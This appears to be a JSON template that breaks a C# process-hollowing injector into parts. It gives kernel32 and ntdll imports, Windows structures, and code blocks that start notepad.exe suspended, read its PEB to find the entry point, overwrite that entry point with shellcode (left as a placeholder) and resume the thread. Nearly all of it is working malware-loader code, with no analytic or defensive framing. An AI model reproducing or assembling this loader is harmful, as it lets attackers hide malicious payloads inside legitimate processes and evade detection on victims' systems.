{
    "ProcessHollowing": {
        "directives": [
            "using System;",
            "using System.Runtime.InteropServices;",
            "using System.Security.Cryptography;",
            "using System.Diagnostics;"
        ],
        "imports": [
            {
                "library": "kernel32.dll",
                "functions": [
                    {
                        "name": "CreateProcess",
                        "signature": "bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);",
                        "attributes": "[DllImport(\"kernel32\", SetLastError = true, CharSet = CharSet.Ansi)]"
                    },
                    {
                        "name": "ReadProcessMemory",
                        "signature": "bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);",
                        "attributes": "[DllImport(\"kernel32.dll\", SetLastError = true)]"
                    },
                    {
                        "name": "WriteProcessMemory",
                        "signature": "bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);",
                        "attributes": "[DllImport(\"kernel32.dll\")]"
                    },
                    {
                        "name": "ResumeThread",
                        "signature": "uint ResumeThread(IntPtr hThread);",
                        "attributes": "[DllImport(\"kernel32.dll\", SetLastError = true)]"
                    }
                ]
            },
            {
                "library": "ntdll.dll",
                "functions": [
                    {
                        "name": "ZwQueryInformationProcess",
                        "signature": "int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);",
                        "attributes": "[DllImport(\"ntdll.dll\", CallingConvention = CallingConvention.StdCall)]"
                    }
                ]
            }
        ],
        "structures": {
            "STARTUPINFO": {
                "definition": "struct STARTUPINFO",
                "fields": [
                    "public Int32 cb;",
                    "public string lpReserved;",
                    "public string lpDesktop;",
                    "public string lpTitle;",
                    "public Int32 dwX;",
                    "public Int32 dwY;",
                    "public Int32 dwXSize;",
                    "public Int32 dwYSize;",
                    "public Int32 dwXCountChars;",
                    "public Int32 dwYCountChars;",
                    "public Int32 dwFillAttribute;",
                    "public Int32 dwFlags;",
                    "public Int16 wShowWindow;",
                    "public Int16 cbReserved2;",
                    "public IntPtr lpReserved2;",
                    "public IntPtr hStdInput;",
                    "public IntPtr hStdOutput;",
                    "public IntPtr hStdError;"
                ]
            },
            "PROCESS_INFORMATION": {
                "definition": "struct PROCESS_INFORMATION",
                "fields": [
                    "public IntPtr hProcess;",
                    "public IntPtr hThread;",
                    "public int dwProcessId;",
                    "public int dwThreadId;"
                ]
            },
            "PROCESS_BASIC_INFORMATION": {
                "definition": "struct PROCESS_BASIC_INFORMATION",
                "fields": [
                    "public IntPtr Reserved1;",
                    "public IntPtr PebAddress;",
                    "public IntPtr Reserved2;",
                    "public IntPtr Reserved3;",
                    "public IntPtr UniquePid;",
                    "public IntPtr MoreReserved;"
                ]
            }
        },
        "code_blocks": {
            "main": [
                "Console.WriteLine(\"[*] Process Hollowing into notepad.exe...\");",
                "Console.WriteLine(\"[*] Press any key to create the suspended process.\");"
            ],
            "create_suspended_process": [
                "STARTUPINFO si = new STARTUPINFO();",
                "PROCESS_INFORMATION pi = new PROCESS_INFORMATION();",
                "bool res = CreateProcess(null, \"C:\\\\Windows\\\\System32\\\\notepad.exe\", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);",
                "if (!res)",
                "{",
                "    Console.WriteLine(\"[!] Failed to create process.\");",
                "    return;",
                "}",
                "Console.WriteLine($\"[*] Created Suspended Process: {pi.dwProcessId}\");"
            ],
            "find_entry_point": [
                "PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();",
                "uint tmp = 0;",
                "IntPtr hProcess = pi.hProcess;",
                "ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);",
                "IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);",
                "byte[] addrBuf = new byte[IntPtr.Size];",
                "IntPtr nRead = IntPtr.Zero;",
                "ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);",
                "IntPtr notepadBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));"
            ],
            "calculate_entry_point": [
                "byte[] data = new byte[0x200];",
                "ReadProcessMemory(hProcess, notepadBase, data, data.Length, out nRead);",
                "uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);",
                "uint opthdr = e_lfanew_offset + 0x28;",
                "uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);",
                "IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)notepadBase);",
                "Console.WriteLine($\"[*] Found Entry Point: 0x{addressOfEntryPoint.ToInt64():X}\");"
            ],
            "inject_shellcode": [
                "PLACEHOLDER_SHELLCODE",
                "WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);",
                "Console.WriteLine($\"[+] Shellcode written to: 0x{addressOfEntryPoint.ToInt64():X}\");"
            ],
            "resume_process": [
                "Console.WriteLine(\"[*] Press any key to resume execution.\");",
                "ResumeThread(pi.hThread);",
                "Console.WriteLine(\"[+] Process Hollowing Complete!\");"
            ]
        }
    }
}
